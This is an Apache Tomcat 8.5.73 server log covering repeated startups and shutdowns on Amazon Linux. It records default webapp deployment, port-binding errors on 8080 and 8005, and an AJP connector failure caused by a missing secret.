14-Jan-2022 06:04:05.820 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:04:05.824 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:04:05.824 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:04:05.824 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:04:05.824 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:04:05.824 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:04:05.825 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:04:05.825 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:04:05.825 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:04:05.825 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:04:05.825 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:04:05.826 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:04:05.826 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:04:05.826 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:04:05.826 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:04:05.827 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:04:05.830 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:04:05.831 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:04:05.831 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:04:05.831 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:04:05.831 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:04:05.991 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:04:06.026 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:04:06.066 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1034 ms
14-Jan-2022 06:04:06.131 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:04:06.131 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:04:06.149 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:04:06.495 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [345] ms
14-Jan-2022 06:04:06.495 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:04:06.528 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [33] ms
14-Jan-2022 06:04:06.528 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:04:06.835 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [306] ms
14-Jan-2022 06:04:06.841 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:04:06.922 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [81] ms
14-Jan-2022 06:04:06.922 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:04:06.970 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [48] ms
14-Jan-2022 06:04:06.973 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:04:06.997 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 930 ms
14-Jan-2022 06:10:56.753 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:10:56.756 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:10:56.756 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:10:56.757 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:10:56.758 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:10:56.758 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:10:56.758 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:10:56.758 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:10:56.765 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:10:56.765 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:10:56.765 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:10:56.766 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:10:56.766 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:10:56.766 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:10:56.766 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:10:56.767 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:10:56.767 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:10:56.770 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:10:56.770 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:10:56.771 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:10:56.771 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:10:56.940 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:10:56.965 SEVERE [main] org.apache.catalina.core.StandardService.initInternal Failed to initialize connector [Connector[HTTP/1.1-8080]]
	org.apache.catalina.LifecycleException: Protocol handler initialization failed
		at org.apache.catalina.connector.Connector.initInternal(Connector.java:1076)
		at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:136)
		at org.apache.catalina.core.StandardService.initInternal(StandardService.java:552)
		at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:136)
		at org.apache.catalina.core.StandardServer.initInternal(StandardServer.java:843)
		at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:136)
		at org.apache.catalina.startup.Catalina.load(Catalina.java:639)
		at org.apache.catalina.startup.Catalina.load(Catalina.java:662)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.load(Bootstrap.java:305)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:475)
	Caused by: java.net.BindException: Address already in use
		at sun.nio.ch.Net.bind0(Native Method)
		at sun.nio.ch.Net.bind(Net.java:461)
		at sun.nio.ch.Net.bind(Net.java:453)
		at sun.nio.ch.ServerSocketChannelImpl.bind(ServerSocketChannelImpl.java:222)
		at sun.nio.ch.ServerSocketAdaptor.bind(ServerSocketAdaptor.java:85)
		at org.apache.tomcat.util.net.NioEndpoint.bind(NioEndpoint.java:221)
		at org.apache.tomcat.util.net.AbstractEndpoint.init(AbstractEndpoint.java:1161)
		at org.apache.tomcat.util.net.AbstractJsseEndpoint.init(AbstractJsseEndpoint.java:222)
		at org.apache.coyote.AbstractProtocol.init(AbstractProtocol.java:599)
		at org.apache.coyote.http11.AbstractHttp11Protocol.init(AbstractHttp11Protocol.java:80)
		at org.apache.catalina.connector.Connector.initInternal(Connector.java:1074)
		... 13 more
14-Jan-2022 06:10:56.969 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1135 ms
14-Jan-2022 06:10:57.013 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:10:57.014 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:10:57.023 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:10:57.396 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [373] ms
14-Jan-2022 06:10:57.397 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:10:57.453 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [56] ms
14-Jan-2022 06:10:57.454 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:10:57.858 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [405] ms
14-Jan-2022 06:10:57.858 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:10:57.900 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [42] ms
14-Jan-2022 06:10:57.900 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:10:57.975 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [75] ms
14-Jan-2022 06:10:57.982 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1012 ms
14-Jan-2022 06:10:57.984 SEVERE [main] org.apache.catalina.core.StandardServer.await StandardServer.await: create[localhost:8005]: 
	java.net.BindException: Address already in use (Bind failed)
		at java.net.PlainSocketImpl.socketBind(Native Method)
		at java.net.AbstractPlainSocketImpl.bind(AbstractPlainSocketImpl.java:387)
		at java.net.ServerSocket.bind(ServerSocket.java:390)
		at java.net.ServerSocket.<init>(ServerSocket.java:252)
		at org.apache.catalina.core.StandardServer.await(StandardServer.java:414)
		at org.apache.catalina.startup.Catalina.await(Catalina.java:776)
		at org.apache.catalina.startup.Catalina.start(Catalina.java:722)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:476)
14-Jan-2022 06:10:57.984 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:10:57.984 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
14-Jan-2022 06:10:58.025 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:10:58.026 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:30:16.246 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
14-Jan-2022 06:30:16.246 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:30:16.251 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
14-Jan-2022 06:30:16.292 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:30:16.295 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:30:19.951 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:30:19.953 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:30:19.953 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:30:19.954 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:30:19.955 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:30:20.133 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:30:20.159 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:30:20.180 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:30:20.182 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:30:20.189 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 974 ms
14-Jan-2022 06:30:20.247 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:30:20.247 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:30:20.263 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:30:20.515 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [252] ms
14-Jan-2022 06:30:20.516 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:30:20.532 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [15] ms
14-Jan-2022 06:30:20.532 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:30:20.755 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [222] ms
14-Jan-2022 06:30:20.755 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:30:20.800 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [45] ms
14-Jan-2022 06:30:20.801 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
14-Jan-2022 06:30:20.830 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [29] ms
14-Jan-2022 06:30:20.833 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:30:20.857 SEVERE [main] org.apache.catalina.core.StandardService.startInternal Failed to start connector [Connector[AJP/1.3-8009]]
	org.apache.catalina.LifecycleException: Protocol handler start failed
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1101)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:439)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:763)
		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
		at org.apache.catalina.startup.Catalina.start(Catalina.java:688)
		at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
		at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
		at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
		at java.lang.reflect.Method.invoke(Method.java:498)
		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:345)
		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:476)
	Caused by: java.lang.IllegalArgumentException: The AJP Connector is configured with secretRequired="true" but the secret attribute is either null or "". This combination is not valid.
		at org.apache.coyote.ajp.AbstractAjpProtocol.start(AbstractAjpProtocol.java:274)
		at org.apache.catalina.connector.Connector.startInternal(Connector.java:1099)
		... 12 more
14-Jan-2022 06:30:20.858 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 668 ms
14-Jan-2022 06:31:13.627 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
14-Jan-2022 06:31:13.628 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:31:13.635 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:31:13.635 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
14-Jan-2022 06:31:13.671 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:31:13.674 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:31:13.675 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:31:13.675 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:31:15.654 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.82-83.359.amzn2.x86_64
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.312.b07-1.amzn2.0.2.x86_64/jre
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_312-b07
14-Jan-2022 06:31:15.656 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Red Hat, Inc.
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
14-Jan-2022 06:31:15.657 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
14-Jan-2022 06:31:15.661 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
14-Jan-2022 06:31:15.661 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
14-Jan-2022 06:31:15.661 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
14-Jan-2022 06:31:15.759 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
14-Jan-2022 06:31:15.782 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:31:15.807 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-0:0:0:0:0:0:0:1-8009"]
14-Jan-2022 06:31:15.809 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
14-Jan-2022 06:31:15.822 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 823 ms
14-Jan-2022 06:31:15.866 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
14-Jan-2022 06:31:15.866 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
14-Jan-2022 06:31:15.875 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
14-Jan-2022 06:31:16.173 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [297] ms
14-Jan-2022 06:31:16.173 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
14-Jan-2022 06:31:16.190 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [16] ms
14-Jan-2022 06:31:16.190 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
14-Jan-2022 06:31:16.456 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [266] ms
14-Jan-2022 06:31:16.456 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
14-Jan-2022 06:31:16.505 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [49] ms
